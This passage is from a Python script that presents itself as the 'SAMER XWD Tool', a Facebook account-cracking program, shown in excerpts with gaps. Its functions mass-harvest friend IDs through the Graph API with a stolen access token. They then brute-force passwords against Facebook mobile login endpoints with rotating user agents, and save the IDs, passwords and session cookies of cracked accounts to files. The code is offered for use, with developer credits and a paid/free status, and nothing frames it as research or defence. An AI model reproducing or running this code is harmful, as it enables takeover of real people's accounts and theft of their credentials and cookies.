...
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mWelCome To SAMER XWD Tool...! ')
os.system('espeak -a 300 " Welcome,  to,  SAMER,  XWD, tool"')
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecXWD Update...? ')
time.sleep(5)
os.system('clear')
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mUpdate Version 3.6 ')
os.system('espeak -a 300 " Update,  Version,  3.6"')
time.sleep(2)
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-MMS/1.3.6 OPN-B'
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/SAMER.XWD.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\$$$$$$  |       $$ | \$$ |
 \______/        \__|  \__|
  ...
  \x1b[38;5;50m 
\33[1;92m╔═════════════════════════════════════════════╗
\33[1;92m║ DEVELOPER    \33[1;91m ❂     \x1b[38;5;48mSAMER\•/NISHANT\33[1;92m                 ║
\33[1;92m║ FACEBOOK \33[1;91m     ❂     \x1b[38;5;208mDON MISHRA X AIN'T NISHANT\33[1;92m              ║
\33[1;92m║ GITHUB     \33[1;91m   ❂    \x1b[38;5;47m SAMERHONI001\33[1;92m               ║
\33[1;92m║ TEAM    \33[1;91m      ❂  \x1b[38;5;47m   SAMER\33[1;92m              ║
\33[1;92m╠═════════════════════════════════════════════╣
\33[1;92m║ VERSION   \33[1;91m    ❂     \x1b[38;5;48m1.0\33[1;92m                     ║
\33[1;92m║ TOOLS    \33[1;91m     ❂    \x1b[38;5;208m FILE-/RANDOM\33[1;92m            ║
\33[1;92m║ WORK     \33[1;91m     ❂    \x1b[38;5;47m WIFI & DATA\33[1;92m             ║
\33[1;92m║ STATUS  \33[1;91m      ❂    \x1b[38;5;208m PAID-/FREE\33[1;92m              ║
\33[1;92m╚═════════════════════════════════════════════╝
\33[1;92m╔═════════════════════════════════════════════╗
\33[1;92m║ FB GROUP : BANAUNA BAKI XA  ║
\33[1;92m╚═════════════════════════════════════════════╝"""
os.system('clear')
print(logo)
...
print('\033[0;97m═════════════════════════════════════════════')
os.system('espeak -a 300 " Welcome,   to,  SAMER,  XWD,  Tools"')
pass
...
def dump_massal():
    ...
    for userr in uid:
        try:
            col = ses.get('https://graph.facebook.com/v3.6/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/xwd.txt  Etc...]')
...
#--------------------[ METODE-B-API ]--------UPDATE-date-2/11/2023---------#
 
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[100;92m{bo}[SAMER•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[SAMER-2F] {idf} • {pw}')
                ...
                print(f'\r\x1b[38;5;208m[SAMER-Ok💚] {idf} • {pw}\n\033[0;93m[💙] COOKIES • \033[1;96m{kuki} ')
                print('\x1b[38;5;50m=============================================')
                os.system('espeak -a 300 " Ok,  SAMER,  id"')
...
#------------------[ METHODE-MBASIC-2 ]------UPdate-2/11/2023-------------#
 
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[SAMER-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}•SAMER-2F] {idf} • {pw}')
                print('\x1b[38;5;50m=============================================')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\x1b[38;5;208m[{time.strftime("%H:%M")}•SAMER-OK] {idf} • {pw} ')
                print('\x1b[38;5;50m=============================================')
                os.system('espeak -a 300 " Ok,  SAMER,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
